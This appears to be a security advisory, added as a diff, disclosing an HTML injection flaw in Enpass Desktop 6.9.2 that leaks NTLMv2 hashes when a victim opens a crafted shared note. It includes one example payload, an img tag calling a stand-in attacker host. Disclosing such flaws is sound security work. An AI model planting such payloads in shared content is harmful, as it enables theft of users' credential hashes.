@@ -1,0 +1,30 @@
+====================================================================
+HTML Injection in Enpass Desktop Application (Version 6.9.2)
+
+Product:            Enpass Password Manager
+Version:            6.9.2
+Issue date:        2024-02-11
+Download:         https://www.enpass.io/beta/
+
+Discovered by Muhammad Danial
+====================================================================
+
+*Overview:*
+A vulnerability has been discovered in the Enpass Desktop application
+version 6.9.2 for Linux and Windows, which could potentially lead to HTML
+injection attacks. This vulnerability may be exploited by an attacker to
+execute malicious code and leak NTLMv2 hashes, compromising the security
+and privacy of affected users.
+
+*Vulnerability Details:*
+The vulnerability exists in the handling of notes within the Enpass Desktop
+application. By crafting a malicious note containing a specially crafted
+payload such as <img src="http://attacker_ip/?c=" />, an attacker can
+inject arbitrary HTML code into the note. When the victim opens the
+malicious note shared by the attacker, the HTML injection payload is
+executed, allowing the attacker to capture the victim's NTLMv2 hashes and
+username through their Enpass Desktop application.
+
+*Impact:*
+Successful exploitation of this vulnerability could result in the leakage
+of usernames and NTLMv2 hashes.
